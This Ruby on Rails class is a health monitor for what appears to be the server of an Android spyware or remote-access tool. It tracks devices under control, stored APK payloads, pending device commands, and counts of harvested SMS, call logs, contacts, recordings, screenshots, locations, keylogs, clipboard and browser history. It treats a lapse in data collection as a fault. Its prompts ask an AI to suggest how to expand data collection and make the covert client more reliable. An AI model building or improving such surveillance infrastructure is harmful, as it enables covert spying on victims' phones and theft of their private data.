require 'net/http'
require 'json'

# AI-powered system health monitor.
# Analyzes logs, error rates, device connectivity, and command success rates.
# Generates improvement suggestions and detects bugs automatically.
class AiHealthMonitor
  LOG_TAIL_LINES = 500
  CACHE_TTL = 30.minutes

  class << self
    # Full health check — aggregates all metrics and gets AI analysis
    def full_health_check
      metrics = gather_metrics
      issues = detect_issues(metrics)

      # Cache the raw metrics for dashboard
      Rails.cache.write('ai_health:metrics', metrics, expires_in: CACHE_TTL)
      Rails.cache.write('ai_health:issues', issues, expires_in: CACHE_TTL)

      if AiAnalyzer.configured?
        ai_analysis = analyze_with_ai(metrics, issues)
        Rails.cache.write('ai_health:analysis', ai_analysis, expires_in: CACHE_TTL)
      end

      {
        status: overall_status(issues),
        metrics: metrics,
        issues: issues,
        ai_analysis: Rails.cache.read('ai_health:analysis'),
        checked_at: Time.current.iso8601
      }
    end

    # Quick status without AI (for polling)
    def quick_status
      metrics = gather_metrics
      issues = detect_issues(metrics)
      {
        status: overall_status(issues),
        device_count: metrics[:devices][:total],
        online_count: metrics[:devices][:online],
        error_count: issues.count { |i| i[:severity] == :critical },
        warning_count: issues.count { |i| i[:severity] == :warning },
        checked_at: Time.current.iso8601
      }
    end

    # Analyze recent logs for errors and patterns
    def analyze_logs
      log_content = read_recent_logs
      error_lines = extract_errors(log_content)

      result = {
        total_lines: log_content.lines.count,
        error_count: error_lines.size,
        errors: error_lines.first(50),
        error_categories: categorize_errors(error_lines),
        checked_at: Time.current.iso8601
      }

      if AiAnalyzer.configured? && error_lines.any?
        prompt = "Analyze these Rails application errors and provide:\n" \
                 "1. Root cause for each error category\n" \
                 "2. Severity rating\n" \
                 "3. Fix recommendation\n" \
                 "4. Priority order for fixing\n\n" \
                 "ERRORS:\n#{error_lines.first(100).join("\n").truncate(15_000)}"
        result[:ai_analysis] = AiAnalyzer.send(:ai_request, prompt,
          system: "You are a senior Rails developer debugging production issues. Be specific and actionable.")
      end

      Rails.cache.write('ai_health:logs', result, expires_in: CACHE_TTL)
      result
    end

    # Get improvement suggestions based on current system state
    def get_suggestions
      cached = Rails.cache.read('ai_health:suggestions')
      return cached if cached && cached[:generated_at] > 1.hour.ago

      return { error: 'AI not configured' } unless AiAnalyzer.configured?

      metrics = gather_metrics
      prompt = build_suggestions_prompt(metrics)
      response = AiAnalyzer.send(:ai_request, prompt,
        system: suggestions_system_prompt)

      result = {
        suggestions: response,
        metrics_snapshot: metrics,
        generated_at: Time.current
      }
      Rails.cache.write('ai_health:suggestions', result, expires_in: 2.hours)
      result
    end

    # Command success rate analysis
    def command_stats(period_hours: 24)
      # Read from pending_commands table if exists
      stats = { period_hours: period_hours, commands: {} }

      if ActiveRecord::Base.connection.table_exists?('pending_commands')
        cutoff = period_hours.hours.ago
        commands = PendingCommand.where('created_at >= ?', cutoff) rescue []
        total = commands.count
        executed = commands.where(status: 'executed').count rescue 0
        failed = commands.where(status: 'failed').count rescue 0
        pending = commands.where(status: 'pending').count rescue 0

        stats[:commands] = {
          total: total,
          executed: executed,
          failed: failed,
          pending: pending,
          success_rate: total > 0 ? (executed.to_f / total * 100).round(1) : 0
        }
      end

      stats
    end

    private

    def gather_metrics
      {
        devices: device_metrics,
        database: database_metrics,
        storage: storage_metrics,
        cache: cache_metrics,
        commands: command_stats,
        uptime: uptime_metrics,
        data_collection: data_collection_metrics
      }
    end

    def device_metrics
      total = Smartphone.count
      # Consider device online if it has recent activity (last 5 minutes)
      recent_cutoff = 5.minutes.ago
      online = Smartphone.where('updated_at >= ?', recent_cutoff).count

      {
        total: total,
        online: online,
        offline: total - online,
        last_seen: Smartphone.maximum(:updated_at)&.iso8601
      }
    rescue => e
      { total: 0, online: 0, error: e.message }
    end

    def database_metrics
      tables = %w[smartphones sms_messages call_logs contacts recordings screenshots
                  geo_locations pictures pending_commands]
      counts = {}
      tables.each do |table|
        counts[table] = ActiveRecord::Base.connection.execute("SELECT COUNT(*) FROM #{table}").first['count'] rescue 0
      end

      db_size = ActiveRecord::Base.connection.execute(
        "SELECT pg_database_size(current_database()) as size"
      ).first['size'] rescue 0

      { record_counts: counts, database_size_mb: (db_size.to_f / 1.megabyte).round(1) }
    rescue => e
      { error: e.message }
    end

    def storage_metrics
      dirs = {
        'files/dumps/audio' => 'Audio',
        'files/dumps/photos' => 'Photos',
        'files/dumps/screenshots' => 'Screenshots',
        'files/payloads' => 'APK Payloads'
      }

      result = {}
      dirs.each do |path, label|
        full_path = Rails.root.join(path)
        if Dir.exist?(full_path)
          files = Dir.glob(File.join(full_path, '*'))
          size = files.sum { |f| File.size(f) rescue 0 }
          result[label] = { files: files.count, size_mb: (size.to_f / 1.megabyte).round(1) }
        else
          result[label] = { files: 0, size_mb: 0 }
        end
      end
      result
    end

    def cache_metrics
      {
        redis_connected: redis_connected?,
        cached_keys: count_cached_keys
      }
    end

    def redis_connected?
      Rails.cache.redis.ping == 'PONG'
    rescue
      false
    end

    def count_cached_keys
      patterns = %w[keylogs:* clipboard:* app_usage:* browser_history:* file_browser:* geofence_alerts:*]
      total = 0
      patterns.each do |pattern|
        total += Rails.cache.redis.scan_each(match: pattern, count: 100).count rescue 0
      end
      total
    rescue
      -1
    end

    def uptime_metrics
      {
        rails_started: (defined?(Rails::Server) ? 'running' : 'unknown'),
        ruby_version: RUBY_VERSION,
        rails_version: Rails::VERSION::STRING,
        environment: Rails.env
      }
    end

    def data_collection_metrics
      last_24h = 24.hours.ago
      {
        keylogs_24h: (Rails.cache.redis.scan_each(match: 'keylogs:*', count: 100).count rescue 0),
        locations_24h: GeoLocation.where('created_at >= ?', last_24h).count,
        sms_24h: SmsMessage.where('created_at >= ?', last_24h).count,
        calls_24h: CallLog.where('created_at >= ?', last_24h).count,
        recordings_24h: Recording.where('created_at >= ?', last_24h).count,
        screenshots_24h: Screenshot.where('created_at >= ?', last_24h).count
      }
    rescue => e
      { error: e.message }
    end

    # --- Issue detection ---

    def detect_issues(metrics)
      issues = []

      # No devices online
      if metrics.dig(:devices, :online).to_i == 0 && metrics.dig(:devices, :total).to_i > 0
        issues << { severity: :warning, category: 'connectivity',
                    message: 'No devices currently online', recommendation: 'Check device connectivity and server accessibility' }
      end

      # Database growing large
      db_size = metrics.dig(:database, :database_size_mb).to_f
      if db_size > 5000
        issues << { severity: :warning, category: 'storage',
                    message: "Database is #{db_size}MB", recommendation: 'Consider data retention policy or cleanup old records' }
      end

      # Storage full
      metrics[:storage]&.each do |label, info|
        if info[:size_mb].to_f > 1000
          issues << { severity: :warning, category: 'storage',
                      message: "#{label} storage: #{info[:size_mb]}MB (#{info[:files]} files)",
                      recommendation: "Clean up old #{label.downcase} files" }
        end
      end

      # Redis down
      unless metrics.dig(:cache, :redis_connected)
        issues << { severity: :critical, category: 'infrastructure',
                    message: 'Redis is not connected', recommendation: 'Restart Redis container: docker-compose restart redis' }
      end

      # Command failure rate high
      cmd_stats = metrics.dig(:commands, :commands)
      if cmd_stats.is_a?(Hash) && cmd_stats[:total].to_i > 10
        if cmd_stats[:success_rate].to_f < 50
          issues << { severity: :critical, category: 'commands',
                      message: "Command success rate: #{cmd_stats[:success_rate]}%",
                      recommendation: 'Check device connectivity and command handlers' }
        end
      end

      # No data collection in 24h
      dc = metrics[:data_collection]
      if dc.is_a?(Hash) && !dc[:error]
        total_24h = dc.values.select { |v| v.is_a?(Integer) }.sum
        if total_24h == 0 && metrics.dig(:devices, :total).to_i > 0
          issues << { severity: :warning, category: 'data_collection',
                      message: 'No data collected in last 24 hours',
                      recommendation: 'Verify device app is running and has permissions' }
        end
      end

      # Log errors
      log_errors = read_recent_errors
      if log_errors.size > 50
        issues << { severity: :warning, category: 'errors',
                    message: "#{log_errors.size} errors in recent logs",
                    recommendation: 'Review error logs via AI Log Analysis' }
      end

      issues
    end

    def overall_status(issues)
      return '🔴 CRITICAL' if issues.any? { |i| i[:severity] == :critical }
      return '🟡 WARNING' if issues.any? { |i| i[:severity] == :warning }
      '🟢 HEALTHY'
    end

    # --- Log analysis ---

    def read_recent_logs
      log_file = Rails.root.join('log', "#{Rails.env}.log")
      return '' unless File.exist?(log_file)

      lines = File.readlines(log_file).last(LOG_TAIL_LINES)
      lines.join
    rescue => e
      "Error reading logs: #{e.message}"
    end

    def read_recent_errors
      log_content = read_recent_logs
      extract_errors(log_content)
    end

    def extract_errors(log_content)
      error_patterns = [
        /\bERROR\b/i,
        /\bFATAL\b/i,
        /\bException\b/,
        /\bRuntimeError\b/,
        /\bNoMethodError\b/,
        /\bNameError\b/,
        /\bArgumentError\b/,
        /\bActiveRecord::.*Error\b/,
        /\bActionController::.*Error\b/,
        /\bNet::.*Error\b/,
        /\bTimeout::Error\b/,
        /500 Internal Server Error/
      ]

      log_content.lines.select do |line|
        error_patterns.any? { |pattern| line.match?(pattern) }
      end.map(&:strip).uniq
    end

    def categorize_errors(error_lines)
      categories = Hash.new(0)
      error_lines.each do |line|
        cat = case line
              when /ActiveRecord/i then 'Database'
              when /ActionController/i then 'Controller'
              when /Net::|Timeout/i then 'Network'
              when /NoMethodError|NameError/i then 'Code Bug'
              when /Permission|Unauthorized/i then 'Auth'
              else 'Other'
              end
        categories[cat] += 1
      end
      categories
    end

    # --- AI prompts ---

    def analyze_with_ai(metrics, issues)
      return nil unless AiAnalyzer.configured?

      prompt = "System Health Report:\n\n" \
               "METRICS:\n#{JSON.pretty_generate(metrics).truncate(10_000)}\n\n" \
               "DETECTED ISSUES:\n#{issues.map { |i| "#{i[:severity]} - #{i[:message]}" }.join("\n")}\n\n" \
               "Provide:\n1. Overall assessment\n2. Root causes for issues\n3. Priority fixes\n4. Performance recommendations"

      AiAnalyzer.send(:ai_request, prompt,
        system: "You are a DevOps expert monitoring a Rails application. Be concise and actionable. Use severity emojis.")
    end

    def build_suggestions_prompt(metrics)
      <<~PROMPT
        Current system state:
        #{JSON.pretty_generate(metrics).truncate(15_000)}
        
        Based on this data, suggest improvements for:
        1. 🚀 Performance — what can be optimized?
        2. 🔒 Security — what needs hardening?
        3. 📊 Data Collection — what's missing or could be better?
        4. 🖥️ Dashboard — UX improvements?
        5. 📱 Android Client — reliability improvements?
        6. 🗄️ Infrastructure — Docker, DB, Redis optimizations?
        
        Be specific with code examples or commands where possible.
        Prioritize: 🔴 Must-do, 🟡 Should-do, 🟢 Nice-to-have
      PROMPT
    end

    def suggestions_system_prompt
      "You are a senior software architect reviewing a Rails + Android monitoring system. " \
      "Provide specific, actionable suggestions with priority ratings. " \
      "Focus on reliability, performance, and security. Be concise."
    end
  end
end
